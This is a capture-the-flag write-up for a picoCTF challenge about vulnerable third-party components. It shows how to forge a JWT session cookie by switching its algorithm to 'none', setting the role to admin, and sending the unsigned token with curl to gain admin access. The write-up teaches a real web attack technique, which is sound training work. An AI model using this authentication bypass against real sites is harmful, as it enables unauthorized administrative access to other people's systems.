## Description
Most web application developers use third party components without testing their security. Some of the past affected companies are:

    Equifax (a US credit bureau organization) - breach due to unpatched Apache Struts web framework CVE-2017-5638
    Mossack Fonesca (Panama Papers law firm) breach - unpatched version of Drupal CMS used
    VerticalScope (internet media company) - outdated version of vBulletin forum software used

Can you identify the components and exploit the vulnerable one? The website is running here. Can you become an admin? You can login as test with the password Test123! to get started.

## Solution

Checking the website, there is a login page which after login we will receive a jwt token in cookie. we can see the cookie by going in the `Inspect Element -> Storage -> Cookies`. here is a sample of curl request that browser sent to website with cookie:

```bash
$ curl "http://saturn.picoctf.net:49698/private" --header "Cookie:token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhdXRoIjoxNzExMDA4ODkxMjMyLCJhZ2VudCI6Ik1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NDsgcnY6MTIzLjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTIzLjAiLCJyb2xlIjoidXNlciIsImlhdCI6MTcxMTAwODg5MX0.7O9cWTPMoEpSmIjbQikIW4ZEi5_4rcktoNvD7UYZGXY"
```

We can decode this jwt using sites like `jwt.io`. here is the decoded payload:
```
HEADER SECTION:
{
  "typ": "JWT",
  "alg": "HS256"
}

PAYLOAD:
{
  "auth": 1711008891232,
  "agent": "Mozilla/5.0 (X11; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0",
  "role": "user",
  "iat": 1711008891
}

and a verify signature section
```

We can check for different vulnerbilities of JWT Framework. One idea is to change alg to 'none' and skip the verify section. Because for all other algorigthms we should have secret info to make the verify section and jwt to work.

Ok. let's make a jwt request with `none` algorithm and `role=admin`

Base64 of header section:
```
{
  "typ": "JWT",
  "alg": "none"
}

will be:  ewogICJ0eXAiOiAiSldUIiwKICAiYWxnIjogIm5vbmUiCn0=
```

Base64 of payload section with role admin:
```
{
  "auth": 1711008891232,
  "agent": "Mozilla/5.0 (X11; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0",
  "role": "admin",
  "iat": 1711008891
}

will be: ewogICJhdXRoIjogMTcxMTAwODg5MTIzMiwKICAiYWdlbnQiOiAiTW96aWxsYS81LjAgKFgxMTsgTGludXggeDg2XzY0OyBydjoxMjMuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMjMuMCIsCiAgInJvbGUiOiAiYWRtaW4iLAogICJpYXQiOiAxNzExMDA4ODkxCn0=
```

let's make jwt with following structure:
```
<header base64 without =>.<payload base64 without =>.<empty verify section>
```

And it will be:
```
ewogICJ0eXAiOiAiSldUIiwKICAiYWxnIjogIm5vbmUiCn0.ewogICJhdXRoIjogMTcxMTAwODg5MTIzMiwKICAiYWdlbnQiOiAiTW96aWxsYS81LjAgKFgxMTsgTGludXggeDg2XzY0OyBydjoxMjMuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMjMuMCIsCiAgInJvbGUiOiAiYWRtaW4iLAogICJpYXQiOiAxNzExMDA4ODkxCn0.
```

And making the curl request:
```bash
$ curl "http://saturn.picoctf.net:49698/private" --header "Cookie:token=ewogICJ0eXAiOiAiSldUIiwKICAiYWxnIjogIm5vbmUiCn0.ewogICJhdXRoIjogMTcxMTAwODg5MTIzMiwKICAiYWdlbnQiOiAiTW96aWxsYS81LjAgKFgxMTsgTGludXggeDg2XzY0OyBydjoxMjMuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMjMuMCIsCiAgInJvbGUiOiAiYWRtaW4iLAogICJpYXQiOiAxNzExMDA4ODkxCn0."
```

And we will get the flag.